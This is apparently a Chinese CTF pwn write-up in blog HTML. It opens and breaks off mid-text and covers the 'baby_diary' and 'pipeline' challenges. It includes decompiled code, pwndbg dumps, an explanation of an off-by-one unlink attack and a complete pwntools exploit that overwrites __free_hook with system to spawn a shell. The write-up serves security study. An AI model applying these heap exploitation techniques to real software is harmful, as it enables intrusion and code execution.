qword_4060[a1]);</span><br><span class="line">  <span class="keyword">return</span> ((v2 - (<span class="keyword">unsigned</span> __int8)sub_146E(a1)) &amp; <span class="number">1</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>free函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_1814</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  LODWORD(v0) = sub_13C3();</span><br><span class="line">  v2 = (<span class="keyword">int</span>)v0;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)v0 &lt;= <span class="number">24</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (_DWORD *)qword_4060[(<span class="keyword">int</span>)v0];</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>((<span class="keyword">void</span> *)qword_4060[v2]);</span><br><span class="line">      qword_4060[v2] = <span class="number">0LL</span>;</span><br><span class="line">      v0 = dword_4140;</span><br><span class="line">      dword_4140[v2] = <span class="number">0</span>;<span class="comment">// 并未清空堆空间内容</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>思路，存在off by one漏洞时，我们可以使用unlink函数进行攻击，下面看看如何绕过：</li></ul><h4 id="构造释放堆块前一个chunk的header"><a href="#构造释放堆块前一个chunk的header" class="headerlink" title="构造释放堆块前一个chunk的header"></a>构造释放堆块前一个chunk的header</h4><ul><li><p>首先通过large bin残存的<code>fd_nextsize</code>和<code>bk_nextsize</code>来构造unlink的<code>fd</code>和<code>bk</code>指针。</p><ul><li>申请一个large bin大小的chunk，首先释放成为unsorted bin，然后申请一个更大的chunk，这样unsorted bin就会进入large bin中，这时他的<code>fd_nextsize</code>和<code>bk_nextsize</code>指针指向的都是自己。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 释放后成为unsorted bin</span><br><span class="line">pwndbg&gt; x/20gx 0x56171f2c93e0</span><br><span class="line">0x56171f2ca010:0x00000000000000000x00000000000013d1</span><br><span class="line">0x56171f2ca020: 0x00007fcb749bdbe00x00007fcb749bdbe0</span><br><span class="line">0x56171f2ca030:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line"># 申请更大的chunk后，或者申请分割的chunk，堆块会先进入large bin，写入fd_nextsize和bk_nextsize两个指针，并同时指向堆块头部。</span><br><span class="line"># 进入large bin后被分割，仍会回到unsorted bin</span><br><span class="line">pwndbg&gt; x/20gx 0x56171f2ca010</span><br><span class="line">0x56171f2ca010:0x00000000000000000x0000000000000031</span><br><span class="line">0x56171f2ca020:0x00000000000000070x0000000000000101</span><br><span class="line">0x56171f2ca030:0x000056171f2200080x000056171f2ca010</span><br><span class="line">0x56171f2ca040:0x00000000000000000x00000000000013b1</span><br><span class="line">0x56171f2ca050:0x00007fcb749bdbe00x00007fcb749bdbe0</span><br></pre></td></tr></table></figure><ul><li>这时候修改<code>fd</code>指针为<code>fd-8</code>，不修改<code>bk</code>指针，这样<code>FD -&gt; bk</code>和<code>BK -&gt; fd</code>同时指向了<code>0x56171f2ca020</code>，并且需要在该地址存储自己的地址<code>0x56171f2ca020</code>，从而绕过unlink的检测。</li><li>这里要注意写入操作中会将地址的倒数第2个字节覆盖为<code>\x00</code>，所以我们要保证上述的几个地址，包括<code>0x56171f2ca020 - 0x18</code>的倒数第2个字节的低位仍然为<code>\x0</code>。</li></ul></li><li><p>如何构造上述地址呢？我们构造两个fast bin，接连将其释放，这样<code>0x56171f2ca020</code>位置就会写入fd的指针，即前一个fast bin的地址，通过修改fast bin的指针来达成目的。</p><ul><li>由于地址末位为<code>0x20</code>，所以只需要写入<code>p8(0x20)</code>即可，但是根据写入的规则，程序会将地址倒数第2个字节覆盖为<code>\x00</code>，倒数第3个字节的低位覆盖为checksum校验位<code>\x2</code>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x56171f2ca010</span><br><span class="line">0x56171f2ca010:0x00000000000000000x0000000000000031</span><br><span class="line">0x56171f2ca020:0x000056171f2200200x0000000000000101</span><br><span class="line">0x56171f2ca030:0x000056171f2200080x000056171f2ca010</span><br></pre></td></tr></table></figure><ul><li>由于上面写入<code>fd</code>的时候也会在倒数第二位覆盖为<code>\x00</code>，倒数第3个字节的低位覆盖为checksum校验位，那么我们需要保证两个写入checksum的是相同的（这里都为<code>\x2</code>）。这里通过修改上面的payload中<code>add(0x20, p64(0x7) + p64(0x101) + p8(0x08)) # 9</code>的无用数据<code>p64(0x7)</code>进行调整。</li><li>实际上除了倒数3位是相同的外，其余参数由于系统开启了PIE都是随机的，所以0x000056171f2<strong>20</strong>020加粗的部分是需要爆破的，有1/256的可能性可以命中。</li></ul></li></ul><h4 id="构造释放堆块的prev-size和prev-inuse位"><a href="#构造释放堆块的prev-size和prev-inuse位" class="headerlink" title="构造释放堆块的prev size和prev inuse位"></a>构造释放堆块的prev size和prev inuse位</h4><ol><li>首先通过内容全部写<code>\x00</code>，将<code>prev_inuse</code>位覆盖为<code>\x0</code>。</li><li>然后使用<code>add(0x17, p64(0) + p64(1)) # 12</code>将<code>prev_size</code>位覆盖为<code>0x100</code>，还是比较巧妙的。但导致<code>prev_size</code>只能写入0x100的倍数，所以我们前面的fackchunk的<code>size</code>位也要写成<code>0x101</code>。</li><li>注意要保证free这个chunk的时候会触发<code>malloc_consolidate</code>函数，所以要确保chunk大小在tcache范围之外，这里选择了<code>0x500</code>。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x55932b25c120</span><br><span class="line">0x55932b25c120:0x00000000000001000x0000000000000510</span><br><span class="line">0x55932b25c130:0x00007f2d9b8700610x00007f2d9b8a1210</span><br><span class="line">0x55932b25c140:0x000055932b25c1200x000055932b25c120</span><br></pre></td></tr></table></figure><h4 id="构造释放堆块下个chunk的prev-inuse位"><a href="#构造释放堆块下个chunk的prev-inuse位" class="headerlink" title="构造释放堆块下个chunk的prev_inuse位"></a>构造释放堆块下个chunk的prev_inuse位</h4><ul><li><p>这里很简单，只需要申请一个chunk即可，为了后面的堆块重叠，我们选择将后面的free chunk全部申请掉。</p></li><li><p>脚本：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(endian = <span class="string">&#x27;little&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">   cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   init-pwndbg</span></span><br><span class="line"><span class="string">   b malloc</span></span><br><span class="line"><span class="string">   b free</span></span><br><span class="line"><span class="string">   &#x27;&#x27;&#x27;</span></span><br><span class="line">   gdb.attach(sh, cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">cho</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(cho))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content = <span class="string">&#x27;a&#x27;</span></span>):</span></span><br><span class="line">   choice(<span class="number">1</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;content: &#x27;</span>, content)</span><br><span class="line">   v3 = <span class="number">0</span></span><br><span class="line">   <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   for char in content:</span></span><br><span class="line"><span class="string">      v3 += ord(char)</span></span><br><span class="line"><span class="string">      while v3 &gt; 0xf:</span></span><br><span class="line"><span class="string">         v3 = (v3 / 0x10) + (v3 % 0x10)</span></span><br><span class="line"><span class="string">   print(content, hex(v3)</span></span><br><span class="line"><span class="string">   &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">   choice(<span class="number">2</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">   choice(<span class="number">3</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">   [add(<span class="number">0x20</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)] <span class="comment"># 0-6</span></span><br><span class="line">   add(<span class="number">0x2000</span>) <span class="comment"># 7</span></span><br><span class="line">   add(<span class="number">0x10</span>) <span class="comment"># 8</span></span><br><span class="line">   free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">   add(<span class="number">0x1000</span> - <span class="number">0x3f0</span> + <span class="number">0x10</span>) <span class="comment"># 7</span></span><br><span class="line">   add(<span class="number">0x20</span>, p64(<span class="number">0x7</span>) + p64(<span class="number">0x101</span>) + p8(<span class="number">0x08</span>)) <span class="comment"># 9</span></span><br><span class="line">   add(<span class="number">0x20</span>) <span class="comment"># 10</span></span><br><span class="line"></span><br><span class="line">   [free(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)]</span><br><span class="line">   free(<span class="number">10</span>)</span><br><span class="line">   free(<span class="number">9</span>)</span><br><span class="line">   [add(<span class="number">0x20</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)] <span class="comment"># 0-6</span></span><br><span class="line">   add(<span class="number">0x20</span>, p8(<span class="number">0x20</span>)) <span class="comment"># 9</span></span><br><span class="line">   add(<span class="number">0x100</span> - <span class="number">0x30</span> * <span class="number">2</span> - <span class="number">0x20</span>) <span class="comment"># 10</span></span><br><span class="line"></span><br><span class="line">   add(<span class="number">0x17</span>) <span class="comment"># 11</span></span><br><span class="line">   free(<span class="number">11</span>)</span><br><span class="line">   add(<span class="number">0x500</span>) <span class="comment"># 11</span></span><br><span class="line">   add(<span class="number">0x17</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p32(<span class="number">0</span>) + p8(<span class="number">0</span>) * <span class="number">3</span>) <span class="comment"># 12</span></span><br><span class="line">   free(<span class="number">12</span>)</span><br><span class="line">   add(<span class="number">0x17</span>, p64(<span class="number">0</span>) + p64(<span class="number">1</span>)) <span class="comment"># 12</span></span><br><span class="line">   add(<span class="number">0xdb0</span>) <span class="comment"># 13</span></span><br><span class="line">   free(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">   add(<span class="number">0x40</span>)  <span class="comment"># 11</span></span><br><span class="line">   show(<span class="number">10</span>)</span><br><span class="line">   sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">   libc.address = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>, timeout = <span class="number">0.5</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x60</span> - <span class="number">0x1ebb80</span></span><br><span class="line">   <span class="keyword">assert</span> libc.address &amp; <span class="number">0xfff</span> == <span class="number">0</span></span><br><span class="line">   <span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">   add(<span class="number">0x10</span>) <span class="comment"># 14</span></span><br><span class="line">   free(<span class="number">14</span>)</span><br><span class="line">   free(<span class="number">12</span>)</span><br><span class="line">   add(<span class="number">0x100</span>, flat(&#123;<span class="number">0x68</span>: <span class="number">0x21</span>, <span class="number">0x70</span>: libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">8</span>&#125;, filler = <span class="string">&#x27;\x00&#x27;</span>)) <span class="comment"># 12</span></span><br><span class="line">   add(<span class="number">0x10</span>) <span class="comment"># 14</span></span><br><span class="line"></span><br><span class="line">   add(<span class="number">0x10</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])) <span class="comment"># 15</span></span><br><span class="line">   free(<span class="number">15</span>)</span><br><span class="line">   sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   sh = process(<span class="string">&quot;./baby_diary&quot;</span>)</span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">      pwn()</span><br><span class="line">   <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">   <span class="keyword">except</span>:</span><br><span class="line">      sh.close()</span><br></pre></td></tr></table></figure><h3 id="pipeline"><a href="#pipeline" class="headerlink" title="pipeline"></a>pipeline</h3><ul><li>使用IDA反编译程序：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(__int64, <span class="keyword">char</span> **, <span class="keyword">char</span> **))((<span class="keyword">char</span> *)&amp;sub_1288 + <span class="number">1</span>))(a1, a2, a3);</span><br><span class="line">  sub_1921();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>跟进函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_1921</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_14E1();</span><br><span class="line">    v0 = sub_1540(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v0 &lt;= <span class="number">6</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;wrong choice&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  __asm &#123; jmp     rax &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>后面的汇编代码IDA似乎解析得不全，我们来解析一下：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000194C                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:000000000000194F                 lea     rdx, ds:0[rax*4] # rdx = 4 * rax</span><br><span class="line">.text:0000000000001957                 lea     rax, byte_20BC # 0xfffff8b4fffff8fa</span><br><span class="line">.text:000000000000195E                 mov     eax, [rdx+rax] # 0xfffff8fa</span><br><span class="line">.text:0000000000001961                 cdqe# 0xfffffffffffff8b4</span><br><span class="line">.text:0000000000001963                 lea     rdx, byte_20BC # rdx = $rebase(0x020BC)</span><br><span class="line">.text:000000000000196A                 add     rax, rdx # rax = $rebase(0x020BC - 0x74C) = $rebase(0x1970)</span><br><span class="line">.text:000000000000196D                 db      3Eh</span><br><span class="line">.text:000000000000196D                 jmp     rax</span><br></pre></td></tr></table></figure><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110071051051.png" alt="image-20211007105004092" style="zoom:50%;" /><ul><li>原理分析下来，<code>byte_20BC</code>数组类似于函数地址表，最后取得的rax为<code>$rebase(0x1970)</code>后的函数：</li></ul><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110071054151.png" alt="image-20211007105436173" style="zoom:50%;" /><ul><li>add函数，发现<code>malloc</code>的结构体是一个链式结构：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_15B5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">void</span> *s; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  s = sub_1391(<span class="number">24</span>);<span class="comment">// malloc函数，堆块大小0x18</span></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( qword_4058 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="number">1</span>;<span class="comment">// v1 = idx</span></span><br><span class="line">    v2 = qword_4058;<span class="comment">// v2 = memsize</span></span><br><span class="line">    <span class="keyword">while</span> ( *(_QWORD *)(v2 + <span class="number">16</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = *(_QWORD *)(v2 + <span class="number">16</span>);</span><br><span class="line">      ++v1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = v2;</span><br><span class="line">      *(_QWORD *)(v2 + <span class="number">16</span>) = s;<span class="comment">// 在0x10的位置上填入下一个buff的地址，证明这是一个链式结构</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> sub_1422((<span class="keyword">unsigned</span> __int64)s);<span class="comment">// checkerr函数</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> __int64)s;</span><br><span class="line">    qword_4058 = (__int64)s;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>新增结构体<code>pipe</code>：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> *malloc_addr;</span><br><span class="line">  <span class="keyword">int</span> offset;</span><br><span class="line">  <span class="keyword">int</span> size;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe</span> *<span class="title">next_ptr</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>映射<code>v2</code>为<code>pipe</code>结构体，去掉类型转换后，代码就清晰很多了：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct pipe *<span class="title">sub_15B5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe</span> *<span class="title">result</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe</span> *<span class="title">v2</span>;</span> <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">void</span> *s; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  s = sub_1391(<span class="number">24</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( qword_4058 )<span class="comment">// 首次qword_4058为空，第一次运行后会进行赋值</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="number">1</span>;</span><br><span class="line">    v2 = qword_4058;</span><br><span class="line">    <span class="keyword">while</span> ( v2-&gt;next_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = v2-&gt;next_ptr;</span><br><span class="line">      ++v1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = v2;</span><br><span class="line">      v2-&gt;next_ptr = s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> sub_1422(s);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = s;</span><br><span class="line">    qword_4058 = s;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>edit函数，实际上虽然叫edit函数，确是新建另一个堆的过程：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct pipe *<span class="title">sub_16B5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe</span> *<span class="title">result</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe</span> *<span class="title">v2</span>;</span> <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = sub_1540(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  result = sub_1651(v1);</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    result-&gt;offset = sub_1540(<span class="string">&quot;offset: &quot;</span>);</span><br><span class="line">    v2-&gt;size = sub_1540(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">    v2-&gt;malloc_addr = sub_13CA(v2-&gt;malloc_addr, v2-&gt;size);<span class="comment">// realloc</span></span><br><span class="line">    <span class="keyword">if</span> ( v2-&gt;malloc_addr )<span class="comment">// 存储再v2结构体的头8位字节</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v2-&gt;offset &gt;= v2-&gt;size || (result = v2-&gt;offset, result &lt; <span class="number">0</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        result = v2;</span><br><span class="line">        v2-&gt;offset = <span 